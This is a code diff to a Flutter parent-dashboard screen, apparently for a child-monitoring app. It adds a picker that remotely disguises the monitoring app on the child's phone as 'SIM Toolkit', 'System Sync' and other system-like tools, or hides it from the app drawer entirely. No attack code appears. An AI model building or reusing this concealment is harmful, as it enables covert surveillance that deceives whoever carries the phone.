@@ -203,9 +203,23 @@ class DashboardScreen extends StatelessWidget {
                             ),
                           ),
                           const SizedBox(height: 2),
-                          Text(
-                            'Disguise: ${activeChild.selectedDisguise} • Android 14',
-                            style: const TextStyle(color: Color(0xFF38BDF8), fontSize: 11, fontWeight: FontWeight.w600),
+                          InkWell(
+                            onTap: () => _showDisguisePickerSheet(context, provider),
+                            borderRadius: BorderRadius.circular(6),
+                            child: Row(
+                              children: [
+                                Text(
+                                  'Icon: ${activeChild.selectedDisguise}',
+                                  style: const TextStyle(color: Color(0xFF38BDF8), fontSize: 11, fontWeight: FontWeight.w600),
+                                ),
+                                const SizedBox(width: 4),
+                                const Icon(Icons.edit, color: Color(0xFF38BDF8), size: 12),
+                                const Text(
+                                  ' • Android 14',
+                                  style: TextStyle(color: Color(0xFF64748B), fontSize: 11),
+                                ),
+                              ],
+                            ),
                           ),
                         ],
                       ),
@@ -443,6 +457,65 @@ class DashboardScreen extends StatelessWidget {
                   },
                 ),
               ],
+            ),
+
+            const SizedBox(height: 14),
+
+            // 🎨 1-Click App Icon & Name Changer Banner
+            InkWell(
+              onTap: () => _showDisguisePickerSheet(context, provider),
+              borderRadius: BorderRadius.circular(16),
+              child: Container(
+                padding: const EdgeInsets.all(14),
+                decoration: BoxDecoration(
+                  color: const Color(0xFF1E293B),
+                  borderRadius: BorderRadius.circular(16),
+                  border: Border.all(color: const Color(0xFF38BDF8).withValues(alpha: 0.3)),
+                ),
+                child: Row(
+                  children: [
+                    Container(
+                      padding: const EdgeInsets.all(10),
+                      decoration: BoxDecoration(
+                        color: const Color(0xFF38BDF8).withValues(alpha: 0.15),
+                        borderRadius: BorderRadius.circular(12),
+                      ),
+                      child: const Icon(Icons.palette_outlined, color: Color(0xFF38BDF8), size: 22),
+                    ),
+                    const SizedBox(width: 14),
+                    Expanded(
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          const Text(
+                            '1-Click App Icon & Name Changer',
+                            style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13),
+                          ),
+                          const SizedBox(height: 2),
+                          Text(
+                            'Active: ${activeChild.selectedDisguise} • Tap to switch icon remotely',
+                            style: const TextStyle(color: Color(0xFF38BDF8), fontSize: 11),
+                          ),
+                        ],
+                      ),
+                    ),
+                    Container(
+                      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
+                      decoration: BoxDecoration(
+                        color: const Color(0xFF38BDF8).withValues(alpha: 0.15),
+                        borderRadius: BorderRadius.circular(10),
+                      ),
+                      child: const Row(
+                        children: [
+                          Text('Change', style: TextStyle(color: Color(0xFF38BDF8), fontSize: 11, fontWeight: FontWeight.bold)),
+                          SizedBox(width: 4),
+                          Icon(Icons.arrow_forward_ios, color: Color(0xFF38BDF8), size: 10),
+                        ],
+                      ),
+                    ),
+                  ],
+                ),
+              ),
             ),
 
             const SizedBox(height: 14),
@@ -833,6 +906,169 @@ class DashboardScreen extends StatelessWidget {
               ),
             );
           },
+        );
+      },
+    );
+  }
+
+  void _showDisguisePickerSheet(BuildContext context, ParentDashboardProvider provider) {
+    final currentDisguise = provider.activeChild.selectedDisguise;
+
+    final options = [
+      {
+        'title': 'SIM Toolkit',
+        'subtitle': 'Default carrier tool found on all Android phones',
+        'icon': Icons.sim_card,
+        'color': const Color(0xFF38BDF8),
+      },
+      {
+        'title': 'Device Support',
+        'subtitle': 'Hardware diagnostics & phone maintenance',
+        'icon': Icons.build_circle_outlined,
+        'color': const Color(0xFF10B981),
+      },
+      {
+        'title': 'Digital Compass',
+        'subtitle': 'Sensor utility with real heading display',
+        'icon': Icons.explore,
+        'color': const Color(0xFFF59E0B),
+      },
+      {
+        'title': 'System Sync',
+        'subtitle': 'Google account cloud synchronization',
+        'icon': Icons.sync,
+        'color': const Color(0xFF818CF8),
+      },
+      {
+        'title': 'Invisible Ghost',
+        'subtitle': 'Vanishes 100% from App Drawer & Home Screen',
+        'icon': Icons.visibility_off,
+        'color': const Color(0xFFEC4899),
+      },
+    ];
+
+    showModalBottomSheet(
+      context: context,
+      backgroundColor: const Color(0xFF1E293B),
+      shape: const RoundedRectangleBorder(
+        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
+      ),
+      builder: (ctx) {
+        return Padding(
+          padding: const EdgeInsets.all(20),
+          child: Column(
+            mainAxisSize: MainAxisSize.min,
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Center(
+                child: Container(
+                  width: 40,
+                  height: 4,
+                  decoration: BoxDecoration(
+                    color: const Color(0xFF475569),
+                    borderRadius: BorderRadius.circular(2),
+                  ),
+                ),
+              ),
+              const SizedBox(height: 16),
+              Row(
+                children: [
+                  Container(
+                    padding: const EdgeInsets.all(8),
+                    decoration: BoxDecoration(
+                      color: const Color(0xFF38BDF8).withValues(alpha: 0.15),
+                      borderRadius: BorderRadius.circular(10),
+                    ),
+                    child: const Icon(Icons.palette_outlined, color: Color(0xFF38BDF8), size: 22),
+                  ),
+                  const SizedBox(width: 12),
+                  const Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    children: [
+                      Text(
+                        '1-Click App Icon & Name Changer',
+                        style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
+                      ),
+                      Text(
+                        'Tap any disguise to apply instantly on child\'s phone',
+                        style: TextStyle(color: Color(0xFF94A3B8), fontSize: 11),
+                      ),
+                    ],
+                  ),
+                ],
+              ),
+              const SizedBox(height: 18),
+              ...options.map((opt) {
+                final isSelected = opt['title'] == currentDisguise;
+                return Padding(
+                  padding: const EdgeInsets.only(bottom: 10),
+                  child: InkWell(
+                    onTap: () {
+                      provider.switchDisguise(opt['title'] as String);
+                      Navigator.pop(ctx);
+                      ScaffoldMessenger.of(context).showSnackBar(
+                        SnackBar(
+                          content: Text('App icon & name changed to "${opt['title']}"!'),
+                          backgroundColor: const Color(0xFF0F172A),
+                          behavior: SnackBarBehavior.floating,
+                        ),
+                      );
+                    },
+                    borderRadius: BorderRadius.circular(14),
+                    child: Container(
+                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
+                      decoration: BoxDecoration(
+                        color: isSelected
+                            ? (opt['color'] as Color).withValues(alpha: 0.15)
+                            : const Color(0xFF0F172A),
+                        borderRadius: BorderRadius.circular(14),
+                        border: Border.all(
+                          color: isSelected ? (opt['color'] as Color) : const Color(0xFF334155),
+                          width: isSelected ? 1.5 : 1,
+                        ),
+                      ),
+                      child: Row(
+                        children: [
+                          Container(
+                            padding: const EdgeInsets.all(8),
+                            decoration: BoxDecoration(
+                              color: (opt['color'] as Color).withValues(alpha: 0.2),
+                              borderRadius: BorderRadius.circular(10),
+                            ),
+                            child: Icon(opt['icon'] as IconData, color: opt['color'] as Color, size: 20),
+                          ),
+                          const SizedBox(width: 12),
+                          Expanded(
+                            child: Column(
+                              crossAxisAlignment: CrossAxisAlignment.start,
+                              children: [
+                                Text(
+                                  opt['title'] as String,
+                                  style: TextStyle(
+                                    color: isSelected ? Colors.white : const Color(0xFFE2E8F0),
+                                    fontSize: 14,
+                                    fontWeight: isSelected ? FontWeight.bold : FontWeight.w500,
+                                  ),
+                                ),
+                                Text(
+                                  opt['subtitle'] as String,
+                                  style: const TextStyle(color: Color(0xFF94A3B8), fontSize: 11),
+                                ),
+                              ],
+                            ),
+                          ),
+                          if (isSelected)
+                            const Icon(Icons.check_circle, color: Color(0xFF10B981), size: 20)
+                          else
+                            const Icon(Icons.arrow_forward_ios, color: Color(0xFF64748B), size: 14),
+                        ],
+                      ),
+                    ),
+                  ),
+                );
+              }),
+            ],
+          ),
         );
       },
     );
